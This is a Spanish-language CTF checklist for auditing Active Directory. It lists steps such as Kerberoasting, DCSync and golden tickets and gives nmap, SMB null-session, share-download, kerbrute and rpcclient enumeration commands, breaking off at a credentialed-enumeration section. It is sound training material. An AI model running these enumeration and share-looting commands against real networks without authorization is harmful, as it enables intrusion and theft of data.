<!DOCTYPE html><!-- Layout espec√≠fico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si est√° disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
‚Üê Volver a Apuntes
</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Planilla / Checklist: Auditor√≠a de Active Directory (CTF) </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h1 id="-planilla--checklist-auditor√≠a-de-active-directory-ctf">üß≠ Planilla / Checklist: Auditor√≠a de Active Directory (CTF)</h1>
<h2 id="-checklist-r√°pido">üìã Checklist R√°pido</h2>
<ol>
<li>
<p>Escaneo de red y puertos</p>
</li>
<li>
<p>Enumeraci√≥n SMB/LDAP/RPC sin credenciales</p>
</li>
<li>
<p>Enumeraci√≥n de usuarios con Kerbrute</p>
</li>
<li>
<p>AS-REP Roasting attack</p>
</li>
<li>
<p>Kerberoasting attack</p>
</li>
<li>
<p>B√∫squeda de GPP passwords</p>
</li>
<li>
<p>Movimiento lateral con credenciales obtenidas</p>
</li>
<li>
<p>An√°lisis con BloodHound</p>
</li>
<li>
<p>DCSync attack</p>
</li>
<li>
<p>Golden/Silver ticket creation</p>
</li>
<li>
<p>Persistencia en el dominio</p>
</li>
<li>
<p>Extracci√≥n de flags/evidencias</p>
</li>
</ol>
<h1 id="0-metadatos-del-ejercicio">0 Metadatos del ejercicio</h1>
<ul>
<li>
<p>Fecha: ____ / ____ / ______</p>
</li>
<li>
<p>NetBIOS computer name:</p>
</li>
<li>
<p>NetBIOS domain name:</p>
</li>
<li>
<p>DNS domain:</p>
</li>
<li>
<p>FQDN:</p>
</li>
<li>
<p>OS:</p>
</li>
<li>
<p>OS version:</p>
</li>
<li>
<p>Credenciales iniciales (si hay):</p>
</li>
<li>
<p>usuario</p>
</li>
<li>
<p>pass</p>
</li>
<li>
<p>NTLM:</p>
</li>
<li>
<p>Objetivo del reto: (flag / DA / DCSync / secreta) _______________________</p>
</li>
</ul>
<hr>
<h3 id="Ô∏è-crear-estructura-de-directorios">‚ö†Ô∏è Crear estructura de directorios</h3>
<ul>
<li>Estructura Pentesting en AD.</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4">#!/bin/bash</span></span>
<span class="line"><span style="color:#6272A4"># Script para crear estructura de carpetas para CTF/pentesting</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Colores para mensajes</span></span>
<span class="line"><span style="color:#BD93F9">GREEN</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">\033[0;32m</span><span style="color:#E9F284">'</span></span>
<span class="line"><span style="color:#BD93F9">YELLOW</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">\033[1;33m</span><span style="color:#E9F284">'</span></span>
<span class="line"><span style="color:#BD93F9">NC</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C">\033[0m</span><span style="color:#E9F284">'</span><span style="color:#6272A4"> # Sin color</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Directorios principales y subdirectorios</span></span>
<span class="line"><span style="color:#FF79C6">declare</span><span style="color:#BD93F9"> -A</span><span style="color:#BD93F9"> dirs</span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2">(</span></span>
<span class="line"><span style="color:#F8F8F2">    [</span><span style="color:#50FA7B;font-style:italic">"scans"</span><span style="color:#F8F8F2">]=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">nmap smb ldap kerberos</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#F8F8F2">    [</span><span style="color:#50FA7B;font-style:italic">"loot"</span><span style="color:#F8F8F2">]=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">hashes credentials bloodhound</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#F8F8F2">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">GREEN</span><span style="color:#F1FA8C">}Creando estructura de carpetas...${</span><span style="color:#BD93F9">NC</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Crear directorios</span></span>
<span class="line"><span style="color:#FF79C6">for</span><span style="color:#BD93F9"> parent</span><span style="color:#FF79C6"> in</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">${</span><span style="color:#FF79C6">!</span><span style="color:#BD93F9">dirs</span><span style="color:#F1FA8C">[</span><span style="color:#FF79C6">@</span><span style="color:#F1FA8C">]}</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">; </span><span style="color:#FF79C6">do</span></span>
<span class="line"><span style="color:#FF79C6">    for</span><span style="color:#BD93F9"> sub</span><span style="color:#FF79C6"> in</span><span style="color:#F8F8F2"> ${</span><span style="color:#BD93F9">dirs</span><span style="color:#F8F8F2">[</span><span style="color:#BD93F9">$parent</span><span style="color:#F8F8F2">]}; </span><span style="color:#FF79C6">do</span></span>
<span class="line"><span style="color:#BD93F9">        dir_path</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#BD93F9">$parent</span><span style="color:#F1FA8C">/</span><span style="color:#BD93F9">$sub</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#FF79C6">        if</span><span style="color:#F8F8F2"> [ </span><span style="color:#FF79C6">!</span><span style="color:#FF79C6"> -d</span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$dir_path</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2"> ]; </span><span style="color:#FF79C6">then</span></span>
<span class="line"><span style="color:#50FA7B">            mkdir</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$dir_path</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">            echo</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">GREEN</span><span style="color:#F1FA8C">}‚úî Creado: </span><span style="color:#BD93F9">$dir_path</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">NC</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#FF79C6">        else</span></span>
<span class="line"><span style="color:#8BE9FD">            echo</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">YELLOW</span><span style="color:#F1FA8C">}‚ö† Ya existe: </span><span style="color:#BD93F9">$dir_path</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">NC</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#FF79C6">        fi</span></span>
<span class="line"><span style="color:#FF79C6">    done</span></span>
<span class="line"><span style="color:#FF79C6">done</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> -e</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">${</span><span style="color:#BD93F9">GREEN</span><span style="color:#F1FA8C">}Estructura de carpetas lista ‚úÖ${</span><span style="color:#BD93F9">NC</span><span style="color:#F1FA8C">}</span><span style="color:#E9F284">"</span></span>
<span class="line"></span></code></pre>
<h1 id="1Ô∏è-reconocimiento-de-red">1Ô∏è Reconocimiento de Red</h1>
<h3 id="-nmap">üíª Nmap</h3>
<ul>
<li>Host discovery</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -oG</span><span style="color:#F1FA8C"> victimPorts</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<p><em>Podemos usar el script de Savitar para ,mayor comodidad</em></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Usage:</span></span>
<span class="line"><span># chmod +x extractPorts.sh</span></span>
<span class="line"><span># ./extractPorts.sh victimPorts</span></span>
<span class="line"><span></span></span>
<span class="line"><span>function extractPorts(){</span></span>
<span class="line"><span>        </span></span>
<span class="line"><span>        if [ -z "$1" ]; then</span></span>
<span class="line"><span>                echo "Usage: extractPorts.sh &#x3C;filename>"</span></span>
<span class="line"><span>                return 1</span></span>
<span class="line"><span>        fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        </span></span>
<span class="line"><span>        if [ ! -f "$1" ]; then</span></span>
<span class="line"><span>                echo "File $1 not found"</span></span>
<span class="line"><span>                return 1</span></span>
<span class="line"><span>        fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        </span></span>
<span class="line"><span>        if ! grep -qE '^[^#].*/open/' "$1"; then</span></span>
<span class="line"><span>                echo "Format Invalid: Use -oG &#x3C;file>, in nmap for a correct format."</span></span>
<span class="line"><span>                return 1</span></span>
<span class="line"><span>        fi</span></span>
<span class="line"><span></span></span>
<span class="line"><span>        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')";</span></span>
<span class="line"><span>        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"</span></span>
<span class="line"><span>        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp</span></span>
<span class="line"><span>        echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp</span></span>
<span class="line"><span>        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp</span></span>
<span class="line"><span>        echo $ports | tr -d '\n' | xclip -selection clipboard</span></span>
<span class="line"><span>        echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp</span></span>
<span class="line"><span>        cat extractPorts.tmp; rm extractPorts.tmp</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>extractPorts "$1"</span></span>
<span class="line"><span></span></span></code></pre>
<ul>
<li>Puertos AD cr√≠ticos</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#BD93F9">puertos</span><span style="color:#F1FA8C"> abierto</span><span style="color:#F8F8F2">s</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -T3</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> escaneo_nmap.txt</span><span style="color:#BD93F9"> -oX</span><span style="color:#F1FA8C"> escaneo_nmap.xml</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<p><em>Convertir xml a html</em></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>xsltproc escaneo_nmap.xml -o target.html</span></span></code></pre>
<ul>
<li>Identificaci√≥n del DC:</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> 88,389,445</span><span style="color:#BD93F9"> --script</span><span style="color:#F1FA8C"> krb5-enum-users,ldap-rootdse,smb-os-discovery</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<ul>
<li>HTTP/WEB quick-fingerprint</li>
</ul>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">whatweb</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F8F8F2"> ; </span><span style="color:#50FA7B">whatweb</span><span style="color:#F1FA8C"> https://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<p>Hosts vivos: ‚Ä¶
Servicios clave por IP: ‚Ä¶</p>
<hr>
<h1 id="2-enumeraci√≥n-de-usuarios-y-recursos">2 Enumeraci√≥n de Usuarios y Recursos</h1>
<ul>
<li>Importante: Cada vez que se encuentre un nuevo usuario o contrase√±a se volver√° a enumerar recursos con la nueva informaci√≥n.</li>
</ul>
<p><em>REVISAR  üîé Enumeraci√≥n sin credenciales</em></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> netexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> --shares</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> netexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> --users</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">RECURS</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -N</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">ls; mget *</span><span style="color:#E9F284">'</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#BD93F9"> -N</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">enum4linux-ng</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -r</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">RECURS</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">crackmapexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> guest</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ''</span><span style="color:#BD93F9"> --shares</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Recursividad</span></span>
<span class="line"><span style="color:#50FA7B">crackmapexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">&#x3C;USER></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;PASS></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> --spider</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">RECURS</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --pattern</span><span style="color:#F1FA8C"> .</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># Descargar data</span></span>
<span class="line"><span style="color:#50FA7B">crackmapexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">&#x3C;USER></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">&#x3C;PASS></span><span style="color:#E9F284">'</span><span style="color:#BD93F9"> --share</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">RECURS</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --get-file</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">fil</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">newfil</span><span style="color:#F8F8F2">e</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -N</span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">rpcclient</span><span style="color:#BD93F9"> -U</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> -N</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span></code></pre>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">kerbrute</span><span style="color:#F1FA8C"> userenum</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#F1FA8C"> users.txt</span><span style="color:#BD93F9"> --dc</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">kerbrute</span><span style="color:#F1FA8C"> userenum</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> --dc</span><span style="color:#BD93F9"> 10.10.10.100</span><span style="color:#F1FA8C"> users.txt</span><span style="color:#F8F8F2"> </span></span>
<span class="line"></span></code></pre>
<h2 id="-enumeraci√≥n-smb--netbios">üîé Enumeraci√≥n SMB / NetBIOS</h2>
<h2 id="1Ô∏è‚É£-sesi√≥n-nula-sin-credenciales">1Ô∏è‚É£ Sesi√≥n nula (sin credenciales)</h2>
<h3 id="-listar-shares">üîç Listar shares</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># netexec / crackmapexec </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> netexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> --shares</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#50FA7B">crackmapexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --shares</span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ''</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ''</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#6272A4"># smbclient </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -N</span><span style="color:#F8F8F2">  </span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4"># smbmap </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#50FA7B">smbmap</span><span style="color:#BD93F9"> -H</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ""</span></span>
<span class="line"></span></code></pre>
<h3 id="-acceder-a-shares-p√∫blicos">üìÇ Acceder a shares p√∫blicos</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># Acceso directo a un share an√≥nimo </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">SHAR</span><span style="color:#F8F8F2">E</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -N</span></span>
<span class="line"></span></code></pre>
<h3 id="-enumeraci√≥n-de-usuariosgrupos">üë• Enumeraci√≥n de usuarios/grupos</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># netexec </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> netexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> ""</span><span style="color:#BD93F9"> --users</span></span>
<span class="line"></span></code></pre>
<h3 id="-acceso-a-carpetas-de-sistema-si-est√°n-abiertas-an√≥nimamente">üìå Acceso a carpetas de sistema (si est√°n abiertas an√≥nimamente)</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/SYSVOL</span><span style="color:#BD93F9"> -N</span><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#50FA7B">smbclient</span><span style="color:#F1FA8C"> //</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DC_HOS</span><span style="color:#F8F8F2">T</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/NETLOGON</span><span style="color:#BD93F9"> -N</span></span>
<span class="line"></span></code></pre>
<hr>
<h2 id="2Ô∏è‚É£-con-credenciales">2Ô∏è‚É£ Con credenciales</h2>
<h3 id="-listar-shares-1">üîç Listar shares</h3>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
<span class="line"><span style="color:#6272A4"># crackmapexec / netexec </span></span>
<span class="line"></span>
<span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> netexec</span><span style="color:#F1FA8C"> smb</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -u</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">usuario</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">password</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> --shares</span></span>
